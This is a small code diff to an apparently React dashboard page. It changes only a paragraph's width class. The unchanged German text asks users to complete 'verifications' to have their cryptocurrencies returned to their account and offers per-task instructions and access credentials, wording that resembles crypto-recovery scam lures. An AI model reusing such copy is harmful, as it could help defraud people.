@@ -427,7 +427,7 @@ export default function Dashboard() {
             <h1 className="text-4xl sm:text-5xl font-bold tracking-tight text-foreground">
               Willkommen zurück
             </h1>
-            <p className="mt-4 text-lg text-muted-foreground max-w-2xl mx-auto leading-relaxed">
+            <p className="mt-4 text-lg text-muted-foreground max-w-3xl mx-auto leading-relaxed">
               Bitte führen Sie die folgenden Verifikationen durch, um Ihre Kryptowährungen sicher auf Ihr Konto zurückzuführen.<br />
               Klicken Sie auf einen Auftrag, um die Anleitung und Zugangsdaten einzusehen.
             </p>
